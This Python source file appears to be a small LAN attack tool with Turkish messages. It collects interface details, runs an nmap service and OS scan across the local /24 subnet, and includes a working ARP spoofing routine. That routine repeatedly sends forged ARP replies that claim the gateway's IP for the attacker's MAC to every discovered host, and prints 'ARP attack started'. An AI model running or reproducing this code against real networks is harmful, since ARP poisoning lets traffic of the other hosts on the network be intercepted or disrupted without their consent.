from netifaces import AF_INET, AF_LINK
import netifaces as ni
import nmap
from scapy.all import *
from scapy.utils import *
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from threading import Thread

class Settings:
    def __init__(self):
        self.iface = ""
        self.ip = ""
        self.networkName = ""
        self.mac = ""
        self.gateway = ""
        self.ipList = []

    def networkInfo(self, iface):
        self.iface = iface
        if iface == 'eth0':
            ip = ni.ifaddresses('eth0')[AF_INET][0]['addr']
            mac = ni.ifaddresses('eth0')[AF_LINK][0]['addr']
            gw = ni.gateways()[2][0][0]
            bcast = ni.ifaddresses('eth0')[AF_INET][0]['broadcast']
            nmask = ni.ifaddresses('eth0')[AF_INET][0]['netmask']
            self.get_network_name()
            self.mac = mac
            self.gateway = gw
            #Thread(target=self.arpspoof, daemon=True).start()
            return ip, mac, gw, bcast, nmask

        elif iface == 'wlan0':
            ip = ni.ifaddresses('wlan0')[AF_INET][0]['addr']
            mac = ni.ifaddresses('wlan0')[AF_LINK][0]['addr']
            gw = ni.gateways()[2][0][0]
            bcast = ni.ifaddresses('wlan0')[AF_INET][0]['broadcast']
            nmask = ni.ifaddresses('wlan0')[AF_INET][0]['netmask']
            self.get_network_name()
            self.mac = mac
            self.gateway = gw
            return ip, mac, gw, bcast, nmask
        else:
            return "127.0.0.1", "00:00:00:00:00:00", "127.0.1.1", "127.1.0.255", "255.255.255.255"

    def get_network_name(self):
        self.ip = ni.ifaddresses(self.iface)[AF_INET][0]['addr']
        index = self.ip.rfind('.')
        ip = self.ip[:index:] + '.0/24'
        self.networkName = ip
        print(ip)


    def scanner(self):
        nm = nmap.PortScanner()
        hosts = []
        host = self.networkName
        sc = nm.scan(host, '80', '-sV -O')
        uphost = sc['nmap']['scanstats']['uphosts']
        host = sc['scan'].keys()
        for h in host:
            hosts.append(h)
        imList = []
        for ip in hosts:
            try:
                imList.append([ip] + [sc['scan'][ip]['addresses']['mac']] + [
                    sc['scan'][ip]['vendor'][sc['scan'][ip]['addresses']['mac']]])
                self.ipList.append(ip)
            except:
                pass
        return imList

    def arpspoof(self):
        conf.verb = 0
        print("BURDAYIMM...!!!!")
        #self.mac = ni.ifaddresses(self.iface)[AF_LINK][0]['addr']
        """if self.iface == 'eth0':
            gateway = ni.gateways()[2][0][0]
        else:
            gateway = ni.gateways()[2][1][0]"""
        hedef_ip = self.ipList
        print(hedef_ip)
        print(self.gateway)
        print(self.mac)
        print(self.ipList)
        counter = len(self.ipList)

        arp = ARP(op=2, psrc=self.gateway, pdst=hedef_ip, hwsrc=self.mac)
        print('[*] ARP Saldirisi Baslatildi ...')
        try:
            while 1:
                send(arp, iface=self.iface)
                time.sleep(2)
        except KeyboardInterrupt:
            print('[*] Saldiri Bitti ...')
